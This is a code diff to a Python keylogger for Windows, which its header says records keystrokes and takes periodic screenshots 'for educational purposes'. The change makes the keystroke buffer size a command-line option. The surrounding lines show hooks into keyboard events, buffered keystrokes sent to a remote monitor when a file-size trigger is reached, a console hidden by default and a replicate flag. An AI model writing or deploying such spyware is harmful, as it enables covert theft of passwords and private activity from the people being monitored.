@@ -19,7 +19,7 @@
 # Created:          19/05/2019
 # License:          GPLv3
 # First Release:    04/09/2019
-# Version:          0.0.1
+# Version:          0.0.2
 #
 # Features:         * Record keystrokes
 #                   * Periodic screen capture
@@ -33,9 +33,6 @@
 #
 # Notes:            This code has been tested, developed and designed to work in a Windows 10 x64 environment.
 #                   Its purpose is only educational.
-#
-# Updates:
-#
 # -----------------------------------------------------------------------------------------------------------
 
 
@@ -80,6 +77,7 @@ SCREXT = '.png'                         # Screenshot file extension
 KEYCODE_EXIT = 6                        # CTRL + F : special combination to close / deactivate keylogger
 PYNPUT_CTRL_EXIT_CHR = 'f'              # CTRL + char : special combination to close using pynput
 KEYSTOSCREENSHOT = 100                  # Screenshots every x Keystrokes (default value)
+KEYMINCHARS = 30                        # Minimum key buffer size to dump data to disk.
 FILESIZETRIGGER = 4096                  # Default keylogger file size trigger to send data
 
 # Server constants
@@ -111,9 +109,8 @@ key_counter = 0
 # Previous event control. Used to detect when the user changes the window or application.
 old_event = None
 
-# Character buffer. Until it is full, it is not written to the file on disk, in this way continuous writes to disk are
-# avoided for each key pressed. When the key_max_chars limit is exceeded the buffer is written to disk.
-key_max_chars = 25
+# Character buffer. Until it is full, it is not written to the file on disk, in this way continuous writes to disk
+# are avoided for each key pressed. When the args.keyminchars limit is exceeded the buffer is written to disk.
 key_buffer = ''
 
 # Path and file name of keylogger data file. The name is assigned in the create_keylog_file() function.
@@ -532,7 +529,7 @@ def flush_key_buffer_to_disk():
 
 # pynput | keyboard event hook
 def on_press_key_pynput(key):
-    global key_buffer, key_max_chars, key_counter, args, key_previous
+    global key_buffer, key_counter, args, key_previous
 
     close_app = False
     # Check exit key combination
@@ -558,7 +555,7 @@ def on_press_key_pynput(key):
     key_previous = key
 
     # if buffer is full, it empties it and sends the file if necessary
-    if len(key_buffer) > key_max_chars:
+    if len(key_buffer) > args.keyminchars:
         monitor_data_send(key_buffer)  # Sends buffer data to monitor
         flush_key_buffer_to_disk()
         # if the file size has exceeded the limit
@@ -586,7 +583,7 @@ def save_special_control_key(event):
 
 # pyWinHook | Adds key to buffer
 def add_key_to_buffer_pyWinHook(event):
-    global key_buffer, key_max_chars, key_counter, args
+    global key_buffer, key_counter, args
     key = event.Ascii
 
     # If you want to show the "space" as a special key,
@@ -612,7 +609,7 @@ def add_key_to_buffer_pyWinHook(event):
             capture_screen()
 
     # If buffer is full, it empties it and sends the file if necessary
-    if len(key_buffer) > key_max_chars:
+    if len(key_buffer) > args.keyminchars:
         monitor_data_send(key_buffer)           # Sends buffer data to monitor
         flush_key_buffer_to_disk()
         # if the file size has exceeded the limit
@@ -796,6 +793,8 @@ def parse_params():
                         help='No Hide console. Only for Debug.')
     parser.add_argument('-k', '--keystoscreenshot', type=int, default=KEYSTOSCREENSHOT,
                         help='Number of keystrokes to take a screenshot. Default value: {}'.format(KEYSTOSCREENSHOT))
+    parser.add_argument('-c', '--keyminchars', type=int, default=KEYMINCHARS,
+                        help='Minimum key buffer size to dump data to disk. Default value: {}'.format(KEYMINCHARS))
     parser.add_argument('-t', '--filesizetrigger', type=int, default=FILESIZETRIGGER,
                         help='File size trigger to send data. Default value: {}'.format(FILESIZETRIGGER))
     parser.add_argument('--replicate', action='store_true', required=False, default=False,
@@ -830,10 +829,10 @@ if args.logtofile:
 logging.basicConfig(level=set_logging_level(args.verbose), format=log_format, datefmt=log_date_fmt,
                     handlers=log_handlers)
 
-logging.debug('Command Line settings: Verbose: {} | Log to File: {} | No Screenshot: {} | Screenshot every {} keys'
-              'File Size Trigger {} | Hook method {} '.
-              format(args.verbose, args.logtofile, args.noscreenshot, args.keystoscreenshot, args.filesizetrigger,
-                     args.hookmodule))
+logging.debug('Command Line settings: Verbose: {} | Log to File: {} | No Screenshot: {} | Key Min Chars {} | '
+              'Screenshot every {} keys | File Size Trigger {} | Hook method {} '.
+              format(args.verbose, args.logtofile, args.noscreenshot, args.keyminchars,
+                     args.keystoscreenshot, args.filesizetrigger, args.hookmodule))
 
 # Init some useful variables
 cpu = platform.processor()
